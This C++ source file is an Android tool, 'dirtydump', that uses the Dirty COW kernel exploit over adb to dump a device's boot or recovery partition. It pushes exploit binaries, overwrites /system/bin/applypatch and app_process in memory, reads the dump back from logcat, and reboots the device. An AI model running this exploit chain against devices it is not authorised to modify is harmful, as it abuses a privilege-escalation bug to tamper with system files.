#include <iostream>
#include <regex>
#include <stdio.h>

using namespace std;

#define BOOT 0
#define RECOVERY 1
#define ANDROID_64 "64"
#define ANDROID_32 "32"

#ifdef __linux__
#define DIRECTORY_SEPARATOR "/"
#elif __APPLE__
#define DIRECTORY_SEPARATOR "/"
#else
#define DIRECTORY_SEPARATOR "\\"
#endif

typedef unsigned char byte;

static string app_dir;
static string arch_type;
static FILE *fsout;
static bool start_write = false;
static int crash_number = 0;
static int block_number = 0;
static long current_size = 0;

/* Shorter regex is possible, but I prefer like that */

/* Used to start writting binary file */
static regex rs("^.+I recowvery: (\\*\\*\\* DUMP START \\*\\*\\*)\\s+");
/* Used to match all data block, and populate <datalist> */
static regex rl("^.+I recowvery: HEXDUMP = \\[([^\\]]+)\\];\\s+");
/* Used to end writting, and exit infinit loop */
static regex rf("^.+I recowvery: (\\*\\*\\* DUMP END \\*\\*\\*)\\s+");
/* Used to intercept error from <recowvery-applypatch> */
static regex re("^.+I recowvery: (\\*\\*\\* DUMP ERROR \\*\\*\\*)\\s+");
/* ADB cmd error */
static regex radbe("^error:(.+)\\s+");

/*
 * Run command
 * Return 0 if success, else -1 if error
 */
int cmd_run(string cmd) {
    char rslt[256];
    int ret = 0;

    FILE *fc = popen(cmd.c_str(), "r");

    /* Redirect stderr to stdout */
    cmd.append(" 2>&1");

    /* To remove the \n or \r\n at the end */
    regex rcmdline("^(.+)\\s+");
    if (fc) {
        while (fgets(rslt, sizeof rslt, fc) != NULL) {
            if (regex_match(string(rslt), rcmdline))
                cout << regex_replace(string(rslt), rcmdline, "$1") << endl;

            /* If error matched, return -1 */
            if (regex_match(rslt, radbe)) {
                ret = -1;
                break;
            }
        }
        cout << endl;
        fclose(fc);
    } else {
        cerr << "Error running '" << string(cmd) << "'" << endl;
        return -1;
    }

    return ret;
}

/*
 * Used to split string
 * s: string to split (in)
 * delim: used char for split (in)
 * elems: string array result (out)
 */
void split(const string &s, char delim, vector<string> &elems) {
    stringstream ss;
    ss.str(s);
    string item;
    while (getline(ss, item, delim)) {
        elems.push_back(item);
    }
}

/*
 * Used to split string
 * s: string to split (in)
 * delim: char delimeter (in)
 * return: vector string
 */
vector<string> split(const string &s, char delim) {
    vector<string> elems;
    split(s, delim, elems);

    return elems;
}

/* Convert hex string to byte array */
void string_to_bytearray(std::string str, unsigned char *&array, int &size) {
    int length = str.length();

    /* Make sure the input string has an even digit numbers */
    if (length % 2 == 1) {
        str = "0" + str;
        length++;
    }

    /* Allocate memory for the output array */
    array = new unsigned char[length / 2];
    size = length / 2;

    std::stringstream sstr(str);
    for (int i = 0; i < size; i++) {
        char ch1, ch2;
        sstr >> ch1 >> ch2;
        int dig1, dig2;
        if (isdigit(ch1))
            dig1 = ch1 - '0';
        else if (ch1 >= 'A' && ch1 <= 'F')
            dig1 = ch1 - 'A' + 10;
        else if (ch1 >= 'a' && ch1 <= 'f')
            dig1 = ch1 - 'a' + 10;
        if (isdigit(ch2))
            dig2 = ch2 - '0';
        else if (ch2 >= 'A' && ch2 <= 'F')
            dig2 = ch2 - 'A' + 10;
        else if (ch2 >= 'a' && ch2 <= 'f')
            dig2 = ch2 - 'a' + 10;
        array[i] = dig1 * 16 + dig2;
    }
}

/*
 * Get architecture type
 * Detect if "/system/bin/app_process64" is on device
 * If found return <ANDROID_64> else <ANDROID_32>
 */
int arch_type_get() {
    int ret = 0;
    char arch_version[8];
    FILE *arch_popen;

    arch_popen =
        popen("adb shell 'if [ -s /system/bin/app_process64 ]; then echo 64; "
              "elif [ -s /system/bin/app_process32 ]; then echo 32; fi;'",
              "r");
    fgets(arch_version, sizeof(arch_version), arch_popen);
    pclose(arch_popen);

    if (strstr(arch_version, "64")) {
        cout << "* Android x64 version detected." << endl;
        arch_type = string(ANDROID_64);
    } else if (strstr(arch_version, "32")) {
        cout << "* Android x32 version detected." << endl;
        arch_type = string(ANDROID_32);
    } else {
        cout << "* Android x32 version detected but not supported (4.4.x or "
                "lower), exiting..."
             << endl;
        ret = -1;
    }

    // TEMP
    system("pause");

    return ret;
}

/*
 * Display help
 */
void help() {
    cout << "dirtydump (wip)\n"
            "Usage: dirtydump <boot/recovery>\n"
            "\n"
            "Dump device boot or recovery partition and save it to an image\n"
            "using dirtycow bug.\n"
            "\n"
            "Information:\n"
            "  This app use the same exploit explained here:\n"
            "    <https://github.com/jcadduono/android_external_dirtycow>\n"
            "  The only difference is by the <applypatch>, instead of\n"
            "  patching it, the app will read your boot or recovery\n"
            "  partition.\n"
            "\n"
            "  The app convert all data to hex value, and display it on\n"
            "  logcat after it read all data from logcat and do the reverse,\n"
            "  convert all hex value to binary, and write it to a image file.\n"
            "\n"
            "  Since this temporary overwrite system files, your device will\n"
            "  start to crash, so after end of process the app will reboot\n"
            "  your device automaticaly.\n"
            "\n"
            "  Don\'t worry, your system is not touched during process.\n"
         << endl;
}

/*
 * Initialize process.
 * Push required files to your device and apply a chmod to them and exit.
 */
int init() {
    char cmd[128];

    cout << "***************\n"
            "**** Init *****\n"
            "***************\n"
         << endl;

    string files[] = {"dirtycow", "recowvery-applypatch_boot",
                      "recowvery-applypatch_recovery",
                      "recowvery-app_process64", "recowvery-app_process32"};
    string cmdlist[] = {
        "adb shell chmod 0777 /data/local/tmp/dirtycow",
        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_boot",
        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_recovery",
        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process64",
        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process32"};

    /* Push files to the device */
    for (auto s : files) {
        sprintf(cmd, "adb push %s%sbin%s%s /data/local/tmp", app_dir.c_str(),
                DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, s.c_str());
        cout << string(cmd) << endl;

        if (cmd_run(cmd) != 0)
            return -1;
    }

    /* Apply chmod to the pushed files */
    for (auto s : cmdlist) {
        cout << string(s) << endl;

        if (cmd_run(s) != 0)
            return -1;
    }

    /* Get arch type */
    if (arch_type_get() != 0)
        return -1;

    return 0;
}

/*
 * Apply exploit to applypatch (for boot or process) and app_process*
 */
int exploit_run(int partition) {
    cout << "**********************\n"
            "**** Run Exploit *****\n"
            "**********************\n"
         << endl;

    string cmdlist[] = {
        "", /* For applypatch */
        ""  /* For app_process */
    };

    if (partition == BOOT)
        cmdlist[0].append(
            "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
            "/data/local/tmp/recowvery-applypatch_boot");
    else if (partition == RECOVERY)
        cmdlist[0].append(
            "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
            "/data/local/tmp/recowvery-applypatch_recovery");
    else
        return -1;

    if (arch_type == ANDROID_64)
        cmdlist[1] =
            "adb shell /data/local/tmp/dirtycow /system/bin/app_process64 "
            "/data/local/tmp/recowvery-app_process64";
    else if (arch_type == ANDROID_32)
        cmdlist[1] =
            "adb shell /data/local/tmp/dirtycow /system/bin/app_process32 "
            "/data/local/tmp/recowvery-app_process32";
    else
        return -1;

    for (auto s : cmdlist) {
        cout << s << endl;

        if (cmd_run(s) != 0)
            return -1;
    }

    return 0;
}

/*
 * Reboot device from adb
 */
int device_reboot() {
    cout << "************************\n"
            "**** Reboot Device *****\n"
            "************************\n"
         << endl;

    return cmd_run(string("adb reboot"));
}

/*
 * Function that do the stuff!
 *
 * If a line contain <*** DUMP START ***> it start to get all hex value in
 * "HEXDUMP = [a1,e2,b4,ect.]" and convert to binary before writing to output
 * file.
 *
 * All other line are:
 * <*** DUMP ERROR ***>: Error during the process or error in your device
 * <*** DUMP END ***>: Dumping is end / end of process.
 * <Other lines>: Displayed
 */
int logcat_convert_to_data(string line) {
    /*
     * If an unexpected EOF from recowvery-applypatch or if no <pipe>...
     * We can't receive a null string, so break the loop, close fsout, and exit
     * the program.
     */
    if (line.empty()) {
        cout << string("* < null > received !") << endl;
        cout << string("Try again...") << endl;
        return -1;
    }

    /*
     * <*** DUMP START ***>
     * set start_write = true to write parsed data to fsout
     */
    if (regex_match(line, rs)) {
        start_write = true;
        cout << "Start writing to file..." << endl;
    }

    /*
     * Parse all string received if match
     * Note:
     *   It's possible to have matched string before intercept DUMP START,
     *   If we convert now, it's a good idea to have a broken output file.
     */
    if (start_write && regex_match(line, rl)) {
        string s = regex_replace(line, rl, "$1");
        vector<string> data = split(s, ',');
        for (int c = 0; c < (int)data.size(); c++) {
            try {
                byte *b = NULL;
                int sb;
                string_to_bytearray(data[c], b, sb);
                fwrite(b, 1, sb, fsout);
            } catch (const exception &ex) {
                cout << endl;
                cout << string("** Exception **") << endl;
                cout << string(" - When convert : ") << data[c] << endl;
                cout << string(" - Message      : ") << ex.what() << endl;
            }
        }
        block_number++;
        current_size = block_number * 32;

        cout << "\r";
        cout << "Block read: " << block_number << " (Size: " << current_size
             << ")";
    } else if (!regex_match(line, rl) &&
               (!regex_match(line, rf) && !start_write) && line.length() > 1) {
        /*
         * Display the other lines (for debuging, logging...)
         */
        cout << line;
    }

    /*
     * <*** DUMP END ***>
     * Flush and close fsout, inform the user, and break the loop.
     */
    if (start_write && regex_match(line, rf)) {
        cout << endl << "Finish" << endl;
        start_write = false;
        return 1;
    }

    /*
     * <*** DUMP ERROR ***>
     * An error intercepted from ADB, close fsout, set start to false.
     * "applypatch" will restart every 3 min.
     * We break the loop after 3 errors.
     */
    if (regex_match(line, re)) {
        cout << std::string("* Error received from ADB *") << std::endl;

        start_write = false;
        if (crash_number == 3) {
            cout << std::string("* Too many tries, please check your < "
                                "recowvery-applypatch.c > and try again.")
                 << std::endl;
            return -1;
        }
        cout << std::string(
                    "* Be patient, recowvery-applypatch will restart in a few "
                    "minutes.")
             << std::endl;
        crash_number++;
    }

    return 0;
}

/*
 * Run <adb logcat -s recowvery> and send line by line to
 * <logcat_convert_to_data> function
 */
int logcat_read() {
    char buff[1024];
    int ret = 0;

    cout << "*********************************\n"
            "**** adb logcat -s recowvery ****\n"
            "*********************************\n"
         << endl;

    FILE *fc = popen("adb logcat -s recowvery", "r");
    if (fc) {
        while (fgets(buff, sizeof buff, fc) != NULL) {
            ret = logcat_convert_to_data(string(buff));
            /* Error occuring */
            if (ret == -1) {
                cerr << "Error during the process !" << endl;
                break;
            }
            /* Process finished */
            if (ret == 1)
                break;
        }

        /*
         * When finish or an error received from adb, <start_write> is set to
         * false.
         * If set to true, a NULL string has been received before receiving a
         * DUMP_END or DUMP_ERROR.
         * So, so we display an error.
         */
        if (start_write) {
            cerr << "Error during the process !" << endl;
            ret = errno;
        }
        fclose(fc);
    } else {
        cerr << "Error running <adb logcat -s recowvery" << endl;
        ret = -1;
    }

    return ret;
}

/* main */
int main(int argc, char **argv) {
    int ret = 0;
    string filename;

    if (argc == 1) {
        help();
        return 0;
    }

    /* Fix for windows
     * If run in same directory as the exe, return only the exe name without
     * folder where it run.
     * So, if DIRECTORY_SEPARATOR not found in argv_str, app_dir = "." for
     * linux, mac and windows
     */
    string argv_str(argv[0]);
    if (argv_str.find_last_of(DIRECTORY_SEPARATOR) != string::npos)
        app_dir =
            argv_str.substr(0, argv_str.find_last_of(DIRECTORY_SEPARATOR));
    else
        app_dir = string(".");

    /* Run init */
    if (init() != 0)
        return -1;

    /* Get user choice and run exploit*/
    if (string(argv[1]) == "boot") {
        ret = exploit_run(BOOT);
        filename = "boot.img";
    } else {
        ret = exploit_run(RECOVERY);
        filename = "recovery.img";
    }

    if (ret != 0)
        return ret;

    fsout = fopen(filename.c_str(), "wb");
    if (!fsout) {
        cerr << "Can't open or create file: <" << string(filename) << ">"
             << endl;
        device_reboot();

        return errno;
    } else {
        ret = logcat_read();
        fclose(fsout);

        cout << "\n"
                "Image file saved here: "
             << app_dir << string(DIRECTORY_SEPARATOR) << string(filename)
             << endl;
    }

    /* End of process, restart the device */
    cout << "Rebooting your device..." << endl;
    device_reboot();

    return 0;
}
